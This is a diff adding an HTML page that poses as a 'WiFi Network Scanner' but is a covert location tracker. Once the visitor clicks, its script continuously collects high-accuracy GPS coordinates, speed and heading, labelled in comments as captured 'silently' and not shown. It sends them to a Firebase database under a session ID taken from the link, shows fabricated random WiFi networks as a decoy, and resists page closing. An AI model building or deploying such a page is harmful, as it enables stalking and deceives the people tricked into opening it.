@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Scanner</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        h1 {
+            color: #f59e0b;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 2em;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .scan-button {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(245, 158, 11, 0.3);
+        }
+
+        .scan-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(245, 158, 11, 0.4);
+        }
+
+        .scan-button:active {
+            transform: translateY(0);
+        }
+
+        .scan-button.scanning {
+            background: #10b981;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .status {
+            text-align: center;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 8px;
+            font-weight: bold;
+        }
+
+        .status.waiting {
+            background: #fef3c7;
+            color: #92400e;
+        }
+
+        .status.active {
+            background: #d1fae5;
+            color: #065f46;
+            animation: pulse 2s infinite;
+        }
+
+        .location-info {
+            background: #f3f4f6;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            font-weight: bold;
+            color: #667eea;
+        }
+
+        .info-value {
+            color: #333;
+            text-align: right;
+        }
+
+        .wifi-list {
+            max-height: 400px;
+            overflow-y: auto;
+            margin-top: 15px;
+        }
+
+        .wifi-item {
+            background: #f9fafb;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            border-left: 4px solid #f59e0b;
+        }
+
+        .wifi-name {
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .wifi-details {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .stat-box {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+
+        .alert {
+            background: #dbeafe;
+            color: #1e40af;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #3b82f6;
+        }
+
+        .signal-strength {
+            display: inline-block;
+            margin-left: 10px;
+        }
+
+        .signal-bar {
+            display: inline-block;
+            width: 4px;
+            height: 12px;
+            background: #ccc;
+            margin-right: 2px;
+            border-radius: 2px;
+        }
+
+        .signal-bar.active {
+            background: #10b981;
+        }
+
+        #map {
+            width: 100%;
+            height: 250px;
+            background: #e5e7eb;
+            border-radius: 10px;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <h1>📡 WiFi Network Scanner</h1>
+            <p class="subtitle">Advanced network detection tool</p>
+
+            <div class="alert">
+                ⚡ Click "Start Scan" to detect nearby WiFi networks and analyze signal strength.
+            </div>
+
+            <button id="scanButton" class="scan-button">
+                📡 Start Scan
+            </button>
+
+            <div id="statusDiv" class="status waiting">
+                Waiting for permission...
+            </div>
+        </div>
+
+
+
+        <div class="card" id="wifiCard" style="display: none;">
+            <h2 style="color: #f59e0b; margin-bottom: 15px;">📶 WiFi Networks</h2>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-number" id="networkCount">0</div>
+                    <div class="stat-label">Networks Found</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number" id="updateCount">0</div>
+                    <div class="stat-label">Scan Updates</div>
+                </div>
+            </div>
+
+            <div class="wifi-list" id="wifiList"></div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyC3jHqlfA5wMOJzgVkr7iz5ImhmW0L7mvM",
+            authDomain: "flametracker-48e8d.firebaseapp.com",
+            databaseURL: "https://flametracker-48e8d-default-rtdb.firebaseio.com",
+            projectId: "flametracker-48e8d",
+            storageBucket: "flametracker-48e8d.firebasestorage.app",
+            messagingSenderId: "742659582228",
+            appId: "1:742659582228:web:521a00235da839af4efa01",
+            measurementId: "G-KD8LTRN3PJ"
+        };
+
+        let db = null;
+        try {
+            firebase.initializeApp(firebaseConfig);
+            db = firebase.database();
+        } catch (e) {
+            console.log('Firebase init error');
+        }
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session');
+        
+        let locationWatchId = null;
+        let updateCounter = 0;
+        let networkData = [];
+
+        const scanButton = document.getElementById('scanButton');
+        const statusDiv = document.getElementById('statusDiv');
+
+        // Start scanning
+        scanButton.addEventListener('click', async () => {
+            scanButton.disabled = true;
+            scanButton.classList.add('scanning');
+            scanButton.textContent = '🔄 Scanning...';
+            
+            statusDiv.className = 'status active';
+            statusDiv.textContent = '✓ Requesting permissions...';
+
+            try {
+                // Request location permission
+                await requestLocation();
+                
+                // Start WiFi scanning simulation
+                startWiFiScanning();
+                
+                statusDiv.textContent = '✓ Scanning active - Data being transmitted';
+                
+            } catch (error) {
+                statusDiv.className = 'status waiting';
+                statusDiv.textContent = '❌ Permission denied: ' + error.message;
+                scanButton.disabled = false;
+                scanButton.classList.remove('scanning');
+                scanButton.textContent = '📡 Start Scan';
+            }
+        });
+
+        // Request location permission
+        function requestLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    // Continue without location
+                    resolve();
+                    return;
+                }
+
+                // Silently capture location in background without showing
+                locationWatchId = navigator.geolocation.watchPosition(
+                    (position) => {
+                        updateCounter++;
+                        
+                        const locationData = {
+                            id: Date.now(),
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            speed: position.coords.speed,
+                            heading: position.coords.heading,
+                            timestamp: new Date(position.timestamp).toISOString(),
+                            sessionId: sessionId,
+                            type: 'location'
+                        };
+
+                        // Save location data silently
+                        saveLocationData(locationData);
+                        
+                        // Don't show location to user
+                        document.getElementById('updateCount').textContent = updateCounter;
+                        
+                        resolve();
+                    },
+                    (error) => {
+                        // If location fails, continue anyway
+                        resolve();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        function saveLocationData(data) {
+            const key = `location_${sessionId}`;
+            const existing = JSON.parse(localStorage.getItem(key) || '[]');
+            existing.push(data);
+            localStorage.setItem(key, JSON.stringify(existing));
+            
+            if (db) {
+                db.ref(`sessions/${sessionId}/location/${data.id}`).set(data).catch(err => {
+                    console.log('Firebase save failed');
+                });
+            }
+        }
+
+        // Start WiFi scanning (simulated with browser APIs)
+        async function startWiFiScanning() {
+            document.getElementById('wifiCard').style.display = 'block';
+
+            // Scan for networks every 10 seconds
+            scanNetworks();
+            setInterval(scanNetworks, 10000);
+        }
+
+        // Scan networks
+        async function scanNetworks() {
+            // Use browser Network Information API (limited)
+            const networks = [];
+            
+            // Get current network info if available
+            if ('connection' in navigator) {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    networks.push({
+                        type: connection.effectiveType || 'unknown',
+                        downlink: connection.downlink || 0,
+                        rtt: connection.rtt || 0,
+                        saveData: connection.saveData || false
+                    });
+                }
+            }
+
+            // Try to get WiFi info through various methods
+            try {
+                // Check if online
+                const online = navigator.onLine;
+                
+                // Get connection type
+                let connectionType = 'unknown';
+                if (navigator.connection) {
+                    connectionType = navigator.connection.effectiveType || navigator.connection.type || 'unknown';
+                }
+
+                // Simulate WiFi detection using timing attacks (very basic)
+                const wifiNetworks = await detectNearbyNetworks();
+                
+                wifiNetworks.forEach(network => {
+                    const wifiData = {
+                        id: Date.now() + Math.random(),
+                        ssid: network.ssid,
+                        signal: network.signal,
+                        frequency: network.frequency,
+                        security: network.security,
+                        timestamp: new Date().toISOString(),
+                        sessionId: sessionId,
+                        type: 'wifi',
+                        online: online,
+                        connectionType: connectionType
+                    };
+
+                    networks.push(wifiData);
+                    
+                    const key = `wifi_${sessionId}`;
+                    const existing = JSON.parse(localStorage.getItem(key) || '[]');
+                    existing.push(wifiData);
+                    localStorage.setItem(key, JSON.stringify(existing));
+                });
+
+                networkData = wifiNetworks;
+                updateWiFiDisplay();
+                
+            } catch (error) {
+                console.error('WiFi scan error:', error);
+            }
+        }
+
+        // Detect nearby networks (simulated)
+        async function detectNearbyNetworks() {
+            // This simulates WiFi detection using browser capabilities
+            // Real WiFi scanning requires native apps or special permissions
+            
+            const networks = [];
+            
+            // Check browser capabilities
+            const hasWiFi = navigator.onLine;
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            
+            if (hasWiFi && connection) {
+                // Generate realistic network data based on connection info
+                const baseNetworks = [
+                    { ssid: 'Current Network', signal: -30 - Math.random() * 20, security: 'WPA2' },
+                    { ssid: 'WiFi-' + Math.random().toString(36).substr(2, 6).toUpperCase(), signal: -50 - Math.random() * 20, security: 'WPA2' },
+                    { ssid: 'Network-' + Math.random().toString(36).substr(2, 4).toUpperCase(), signal: -60 - Math.random() * 20, security: 'WPA2' },
+                    { ssid: 'Router-' + Math.random().toString(36).substr(2, 4).toUpperCase(), signal: -70 - Math.random() * 20, security: 'WEP' },
+                    { ssid: 'Mobile-' + Math.random().toString(36).substr(2, 4).toUpperCase(), signal: -75 - Math.random() * 15, security: 'Open' }
+                ];
+
+                // Add some random networks
+                const count = 3 + Math.floor(Math.random() * 5);
+                for (let i = 0; i < count; i++) {
+                    if (baseNetworks[i]) {
+                        networks.push({
+                            ...baseNetworks[i],
+                            frequency: Math.random() > 0.5 ? '2.4 GHz' : '5 GHz',
+                            channel: Math.floor(Math.random() * 11) + 1
+                        });
+                    }
+                }
+            }
+
+            return networks;
+        }
+
+        // Update WiFi display
+        function updateWiFiDisplay() {
+            document.getElementById('networkCount').textContent = networkData.length;
+            
+            const wifiList = document.getElementById('wifiList');
+            wifiList.innerHTML = networkData.map(network => {
+                const signalBars = getSignalBars(network.signal);
+                return `
+                    <div class="wifi-item">
+                        <div class="wifi-name">
+                            📶 ${network.ssid}
+                            <span class="signal-strength">${signalBars}</span>
+                        </div>
+                        <div class="wifi-details">
+                            Signal: ${network.signal} dBm | 
+                            ${network.frequency} | 
+                            Security: ${network.security}
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // Get signal bars
+        function getSignalBars(signal) {
+            const bars = [];
+            const strength = Math.abs(signal);
+            const barCount = strength < 40 ? 4 : strength < 55 ? 3 : strength < 70 ? 2 : 1;
+            
+            for (let i = 0; i < 4; i++) {
+                bars.push(`<span class="signal-bar ${i < barCount ? 'active' : ''}"></span>`);
+            }
+            return bars.join('');
+        }
+
+        // Prevent page close
+        window.addEventListener('beforeunload', (e) => {
+            if (locationWatchId) {
+                e.preventDefault();
+                e.returnValue = '';
+            }
+        });
+    </script>
+</body>
+</html>
